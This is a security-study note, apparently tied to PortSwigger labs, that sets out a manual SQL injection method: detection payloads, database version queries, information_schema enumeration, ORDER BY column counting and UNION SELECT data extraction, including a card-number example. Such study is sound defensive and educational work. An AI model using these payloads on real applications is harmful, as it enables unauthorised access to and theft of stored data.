# Manual Injection Methodology

### **Manual SQL Injection Detection**

SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:

* Submitting the single quote character `'` and looking for errors or other anomalies.
* Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
* Submitting Boolean conditions such as `OR 1=1` and `OR 1=2, and` looking for differences in the application's responses.
* Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
* Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

### **Determine DB Verison**

* Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software
  * MySQL - SELECT @@version
    * &#x20;'+UNION+SELECT+@@version,+NULL#
  * Oracle - SELECT \* FROM v$version
    * '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
  * PostgreSQL - SELECT version()
* These queries can be linked with a UNION injection using the following syntax:
  * ' UNION SELECT @@version#
* @@version can be replaced with a number of different commands, depending on what you want to retrieve from the database; for example, @@hostname or @@datadir.
* [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
* [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

### Determine the database structure and table names

* &#x20;In order to extract data from the database, we will need to understand the structure of the database.&#x20;
* Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.
* You can query information\_schema.tables to list the tables in the database:
  * SELECT \* FROM information\_schema.tables
* You can then query information\_schema.columns to list the columns in individual tables:
  * SELECT \* FROM information\_schema.columns WHERE table\_name = 'Users'
* For Oracle
  * You can list tables by querying all\_tables:
    * SELECT \* FROM all\_tables
  * And you can list columns by querying all\_tab\_columns:
    * SELECT \* FROM all\_tab\_columns WHERE table\_name = 'USERS'
* We can also get it using a UNION SELECT query (Exmaple for a 5 column table)
  * `input' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()#`
* [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
* [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

### **Determine vulnerable columns**

* In order to query the database on any information, you must first find out how many columns the original table being queried has. To achieve this you can use the following statement: `' ORDER BY 1#`
* As our `SELECT` statement must have the same number of columns as the existing statement, we first need to determine the number of columns in the current `SELECT` statement. You can do this with the `ORDER BYn` command. Start at 1, and increment n by 1 until you receive an error.\
  &#x20;◇ `input' ORDER BY 5 #`
* Once you have determined the number of columns, it’s time to identify the vulnerable columns on the page. To do this, we can run the following `UNION SELECT` statement, which will show the numbers of the vulnerable columns on the page. The example if for a `SELECT`statement with five columns.\
  &#x20;◇ `input' UNION SELECT 1,2,3,4,5 #`

### **Determine the column names**

* &#x20;Now we know the tables that exist in the database, we need to understand the structure of the columns in each table.
* The \*  from the above SELECT query can be replaced with whichever piece of information you like from the information\_schema.tables table, such as TABLE\_SCHEMA, TABLE\_NAME, TABLE\_TYPE.
* Once information regarding the tables in the database has been discovered, it becomes possible to query the tables for their columns. This can be achieved using the following syntax:
  * SELECT \* FROM information\_schema.columns WHERE table\_name='Table'
* We can do this with t
* Or we can also get it using a UNION SELECT query:
  * \
    `input' UNION SELECT 1,group_concat(column_name, 0x0a),3,4,5 FROM information_schema.columns WHERE table_name="customers"#`

### Extract data

* &#x20;Now that you know the database schema, including the table names and column names, construct `UNION SELECT` queries to extract the desired data.
* Example DB:  ID ,Firstname ,Lastname ,Email ,PhoneNumber ,CardNum ,ExpDate 3E
  * Basic: `SELECT` `*` `FROM` `user_preferences` `WHERE` `email =` `'';`
  * Always true statements: OR 1=1, OR 2=2, 1 <> 2

[https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)
